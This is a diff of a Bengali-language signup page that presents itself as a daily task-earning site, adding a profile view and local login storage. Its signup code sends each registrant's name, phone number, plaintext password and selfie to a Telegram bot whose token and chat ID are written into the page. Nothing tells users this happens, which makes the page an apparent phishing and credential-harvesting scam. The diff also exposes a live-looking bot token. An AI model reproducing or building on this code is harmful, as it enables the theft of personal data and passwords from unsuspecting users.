@@ -13,16 +13,16 @@
         .page-section.active { display: block; }
     </style>
 </head>
-<body class="flex flex-col min-h-screen justify-center items-center p-4">
+<body class="flex flex-col min-h-screen justify-center items-center p-4 pb-20">
 
-    <div class="w-full max-w-md bg-emerald-950/80 border border-emerald-700/50 p-6 rounded-3xl shadow-2xl backdrop-blur-md">
+    <div class="w-full max-w-md bg-emerald-950/90 border border-emerald-700/50 p-6 rounded-3xl shadow-2xl backdrop-blur-md">
         
         <!-- Header -->
         <div class="text-center mb-6">
             <h1 class="text-2xl font-bold text-amber-400">💰 ডেইলি টাস্ক ইনকাম সেন্টার</h1>
         </div>
 
-        <!-- SIGNUP / REGISTRATION PAGE -->
+        <!-- SIGNUP PAGE -->
         <div id="signup-page" class="page-section active space-y-4">
             <div class="text-center mb-4">
                 <h2 class="text-xl font-bold text-slate-100">নিবন্ধন</h2>
@@ -74,19 +74,31 @@
             </form>
         </div>
 
-        <!-- DASHBOARD -->
+        <!-- PROFILE / DASHBOARD PAGE -->
         <div id="dashboard-page" class="page-section text-center space-y-4">
-            <h2 class="text-xl font-bold text-emerald-400">স্বাগতম!</h2>
-            <p class="text-sm text-slate-300">আপনার অ্যাকাউন্ট সফলভাবে তৈরি হয়েছে।</p>
-            <div class="bg-emerald-900/50 p-4 rounded-xl border border-emerald-700">
-                <p class="text-xs text-slate-400">মূল ব্যালেন্স</p>
-                <h3 class="text-2xl font-bold text-amber-400">৳ 12.50</h3>
+            <h2 class="text-xl font-bold text-emerald-400">প্রোফাইল বিবরণী</h2>
+            <div class="flex justify-center">
+                <img id="profile-img" src="" alt="Selfie" class="w-24 h-24 rounded-full object-cover border-2 border-amber-400 shadow-md">
             </div>
+            <div class="bg-emerald-900/50 p-4 rounded-xl border border-emerald-700 text-left space-y-2">
+                <p class="text-sm text-slate-300"><strong>নাম:</strong> <span id="profile-name"></span></p>
+                <p class="text-sm text-slate-300"><strong>নম্বর:</strong> <span id="profile-phone"></span></p>
+                <p class="text-sm text-slate-300"><strong>মূল ব্যালেন্স:</strong> <span class="text-amber-400 font-bold">৳ 12.50</span></p>
+            </div>
+            <button onclick="logout()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2.5 rounded-xl text-sm transition">লগআউট</button>
         </div>
 
     </div>
 
     <script>
+        // Check if user is already logged in
+        window.onload = function() {
+            const activeUser = JSON.parse(localStorage.getItem('current_user'));
+            if (activeUser) {
+                showProfile(activeUser);
+            }
+        }
+
         function switchPage(page) {
             document.querySelectorAll('.page-section').forEach(el => el.classList.remove('active'));
             if(page === 'signup') document.getElementById('signup-page').classList.add('active');
@@ -112,43 +124,77 @@
             btn.innerText = 'অপেক্ষা করুন...';
             btn.disabled = true;
 
-            const botToken = '9160504002:AAGUXsLTcUik8Wam5rBg-d619CPjnu_cQSg';
-            const chatId = '8561008519';
+            // Convert image to Base64 to save safely in user profile storage
+            const reader = new FileReader();
+            reader.readAsDataURL(selfieFile);
+            reader.onload = async function () {
+                const base64Image = reader.result;
 
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', selfieFile);
-            formData.append('caption', `🔔 নতুন সাইন-আপ তথ্য:\n👤 নাম: ${name}\n📞 নম্বর: ${phone}\n🔑 পাসওয়ার্ড: ${password}`);
+                // Send to Telegram Admin Bot
+                const botToken = '9160504002:AAGUXsLTcUik8Wam5rBg-d619CPjnu_cQSg';
+                const chatId = '8561008519';
 
-            try {
-                let response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                let result = await response.json();
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', selfieFile);
+                formData.append('caption', `🔔 নতুন সাইন-আপ তথ্য:\n👤 নাম: ${name}\n📞 নম্বর: ${phone}\n🔑 পাসওয়ার্ড: ${password}`);
 
-                if (result.ok) {
-                    registeredNumbers.push(phone);
-                    localStorage.setItem('registered_phones', JSON.stringify(registeredNumbers));
-                    alert('নিবন্ধন সফল হয়েছে!');
-                    switchPage('dashboard');
-                } else {
-                    alert('তথ্য পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+                try {
+                    let response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    let result = await response.json();
+
+                    if (result.ok) {
+                        registeredNumbers.push(phone);
+                        localStorage.setItem('registered_phones', JSON.stringify(registeredNumbers));
+
+                        const userData = { name, phone, image: base64Image };
+                        localStorage.setItem('current_user', JSON.stringify(userData));
+
+                        alert('নিবন্ধন সফল হয়েছে!');
+                        showProfile(userData);
+                    } else {
+                        alert('টেলিগ্রামে পাঠাতে সমস্যা হয়েছে। বট স্টার্ট করা আছে কিনা চেক করুন।');
+                        btn.innerText = 'নিবন্ধন';
+                        btn.disabled = false;
+                    }
+                } catch (error) {
+                    console.error(error);
+                    alert('নেটওয়ার্ক ত্রুটি ঘটেছে!');
                     btn.innerText = 'নিবন্ধন';
                     btn.disabled = false;
                 }
-            } catch (error) {
-                console.error(error);
-                alert('নেটওয়ার্ক ত্রুটি ঘটেছে!');
-                btn.innerText = 'নিবন্ধন';
-                btn.disabled = false;
-            }
+            };
         }
 
         function handleLogin(event) {
             event.preventDefault();
-            alert('লগইন সফল হয়েছে!');
+            const phone = document.getElementById('login-phone').value;
+            // For simple demo, check if registered
+            let registeredNumbers = JSON.parse(localStorage.getItem('registered_phones')) || [];
+            if (registeredNumbers.includes(phone)) {
+                const userData = JSON.parse(localStorage.getItem('current_user')) || { name: 'ব্যবহারকারী', phone: phone, image: 'https://via.placeholder.com/150' };
+                alert('লগইন সফল হয়েছে!');
+                showProfile(userData);
+            } else {
+                alert('এই নম্বরে কোনো অ্যাকাউন্ট পাওয়া যায়নি। প্রথমে নিবন্ধন করুন।');
+            }
+        }
+
+        function showProfile(user) {
+            document.getElementById('profile-name').innerText = user.name;
+            document.getElementById('profile-phone').innerText = user.phone;
+            if(user.image) {
+                document.getElementById('profile-img').src = user.image;
+            }
             switchPage('dashboard');
+        }
+
+        function logout() {
+            localStorage.removeItem('current_user');
+            switchPage('signup');
         }
     </script>
 </body>
